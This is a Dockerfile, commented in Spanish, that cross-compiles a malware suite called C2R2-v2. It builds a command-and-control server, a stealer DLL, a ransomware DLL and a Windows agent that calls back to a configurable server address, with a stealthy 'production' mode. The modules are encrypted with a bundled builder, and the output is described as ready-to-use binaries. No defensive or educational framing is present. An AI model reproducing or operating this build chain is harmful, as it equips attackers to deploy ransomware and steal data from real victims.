# Dockerfile para compilar todos los componentes de C2R2-v2
# Genera binarios listos para usar: servidor, agente, builder, y DLLs

FROM rust:1.70-slim

# Instalar dependencias para compilación cruzada a Windows
RUN apt-get update && apt-get install -y \
    mingw-w64 \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

# Agregar target de Windows
RUN rustup target add x86_64-pc-windows-gnu

# Agregar target de Linux para el servidor
RUN rustup target add x86_64-unknown-linux-gnu

# Crear directorio de trabajo
WORKDIR /workspace

# Copiar el workspace completo
COPY . .

# Argumentos de compilación configurables
ARG SERVER_IP=0.0.0.0
ARG SERVER_PORT=4444
ARG AGENT_NAME=agent
ARG PRODUCTION_MODE=false

# Script de compilación
RUN mkdir -p /output

# 1. Compilar el servidor (Linux)
RUN echo "🔨 Compilando servidor C2R2..." && \
    cd c2r2-server && \
    cargo build --release --target x86_64-unknown-linux-gnu && \
    cp target/x86_64-unknown-linux-gnu/release/c2r2-server /output/c2r2-server && \
    echo "✅ Servidor compilado: /output/c2r2-server"

# 2. Compilar stealer DLL
RUN echo "🔨 Compilando stealer.dll..." && \
    cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll && \
    cp target/x86_64-pc-windows-gnu/release/stealer.dll /output/stealer.dll && \
    echo "✅ Stealer DLL compilado: /output/stealer.dll"

# 3. Compilar ransomware DLL
RUN echo "🔨 Compilando ransomware.dll..." && \
    cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll && \
    cp target/x86_64-pc-windows-gnu/release/ransomware.dll /output/ransomware.dll && \
    echo "✅ Ransomware DLL compilado: /output/ransomware.dll"

# 4. Compilar el builder (Linux)
RUN echo "🔨 Compilando builder..." && \
    cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
    cp target/x86_64-unknown-linux-gnu/release/builder /output/builder && \
    chmod +x /output/builder && \
    echo "✅ Builder compilado: /output/builder"

# 5. Encriptar módulos usando el builder
RUN echo "🔐 Encriptando módulo stealer..." && \
    /output/builder encrypt-module --module stealer && \
    echo "✅ Stealer encriptado"

RUN echo "🔐 Encriptando módulo ransomware..." && \
    /output/builder encrypt-module --module ransomware && \
    echo "✅ Ransomware encriptado"

# 6. Copiar módulos encriptados
RUN mkdir -p /output/modules && \
    cp c2r2-server/modules/*.enc /output/modules/ 2>/dev/null || true && \
    cp c2r2-server/modules/*.key /output/modules/ 2>/dev/null || true && \
    echo "✅ Módulos encriptados copiados a /output/modules"

# 7. Compilar el agente con configuración específica
RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
    if [ "$PRODUCTION_MODE" = "true" ]; then \
        /output/builder build-agent \
            --name "${AGENT_NAME}" \
            --server "${SERVER_IP}:${SERVER_PORT}" \
            --production; \
    else \
        /output/builder build-agent \
            --name "${AGENT_NAME}" \
            --server "${SERVER_IP}:${SERVER_PORT}"; \
    fi && \
    cp ${AGENT_NAME}.exe /output/${AGENT_NAME}.exe && \
    echo "✅ Agente compilado: /output/${AGENT_NAME}.exe"

# Crear un resumen de los binarios generados
RUN echo "📦 RESUMEN DE COMPILACIÓN" > /output/BUILD_INFO.txt && \
    echo "========================" >> /output/BUILD_INFO.txt && \
    echo "" >> /output/BUILD_INFO.txt && \
    echo "Servidor C2:" >> /output/BUILD_INFO.txt && \
    ls -lh /output/c2r2-server >> /output/BUILD_INFO.txt && \
    echo "" >> /output/BUILD_INFO.txt && \
    echo "Agente Windows:" >> /output/BUILD_INFO.txt && \
    ls -lh /output/${AGENT_NAME}.exe >> /output/BUILD_INFO.txt && \
    echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /output/BUILD_INFO.txt && \
    echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /output/BUILD_INFO.txt && \
    echo "" >> /output/BUILD_INFO.txt && \
    echo "Builder:" >> /output/BUILD_INFO.txt && \
    ls -lh /output/builder >> /output/BUILD_INFO.txt && \
    echo "" >> /output/BUILD_INFO.txt && \
    echo "DLLs:" >> /output/BUILD_INFO.txt && \
    ls -lh /output/*.dll >> /output/BUILD_INFO.txt && \
    echo "" >> /output/BUILD_INFO.txt && \
    echo "Módulos encriptados:" >> /output/BUILD_INFO.txt && \
    ls -lh /output/modules/ >> /output/BUILD_INFO.txt && \
    cat /output/BUILD_INFO.txt

# El directorio /output contiene todos los binarios listos para usar
VOLUME ["/output"]

# Por defecto, mostrar información de compilación
CMD ["cat", "/output/BUILD_INFO.txt"]
